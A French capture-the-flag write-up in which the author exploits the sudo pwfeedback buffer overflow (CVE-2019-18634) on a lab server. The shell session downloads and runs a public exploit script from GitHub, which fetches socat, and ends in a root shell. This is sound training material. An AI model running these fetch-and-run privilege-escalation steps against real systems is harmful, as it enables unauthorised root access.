# Sudoku v2 - 256 pts

Énoncé :

> L'administrateur du serveur a voulu vous aider en ajoutant une aide visuelle lors de la saisie de votre mot de passe. 
>  Hum Hum.. C'est pas une bonne idée ! 
>
>  === Connexion SSH ===
>  Login : `padawan`
>  Mdp :  `padawan`
>  Serveur :` sudoku2.phack.fr`
>
>  Artiste : `@Eagleslam`

```
$ ssh padawan@sudoku2.phack.fr

Bienvenue !

 Le flag se trouve dans /home/master/flag.txt
 Malheureusement, tu n'as pas les droits de le lire.

 Trouves un moyen d'y accéder par toi même.

 Bonne chance...


...............
-bash-5.1$ cat note.txt 


Cher Padawan,

Je sais que tu te trompes souvent de mot de passe.
J'ai donc ajouté une fonctionnalité qui permet d'afficher des * dès que tu saisis un caractère (sudo).
Cela devrait t'aider.

Bon courage,
Ton Master

..............

```

Cette fois je lis les flags du challenges et je vois qu'il y a "cve". Après une [petite recherche sur Internet](https://www.startpage.com/row/search?q=sudo%20password%20feedback%20vulnerability) on tombe sur ce quon cherche :

> Buffer overflow when pwfeedback is set in sudoers, CVE-2019-18634

On cherche le nom de la CVE + "exploit" et on tombe sur ce [repo GitHub](https://github.com/Plazmaz/CVE-2019-18634). Plus qu'à suivre les consignes :

```
$ wget https://raw.githubusercontent.com/Plazmaz/CVE-2019-18634/master/self-contained.sh
Connecting to raw.githubusercontent.com (185.199.110.133:443)
saving to 'self-contained.sh'
self-contained.sh    100% |******************************************************************************************************************************************************|  1305  0:00:00 ETA
'self-contained.sh' saved
$ chmod +x self-contained.sh
$ ./self-contained.sh
Connecting to raw.githubusercontent.com (185.199.111.133:443)
saving to 'socat'
socat                100% |******************************************************************************************************************************************************|  366k  0:00:00 ETA
'socat' saved
/usr/lib/gcc/x86_64-alpine-linux-musl/10.2.1/../../../../x86_64-alpine-linux-musl/bin/ld: cannot open output file /tmp/pipe: Permission denied
collect2: error: ld returned 1 exit status
[sudo] password for padawan: 
Sorry, try again.
# exit
Sorry, try again.
sudo: 3 incorrect password attempts
Exploiting!
```

Et Bingo, on est root :

```
# id
uid=0(root) gid=65533(nogroup) groups=65533(nogroup),65533(nogroup)
# cat /home/master/flag.txt 
PHACK{*_****_****_****_***_**_*_****_***}
```

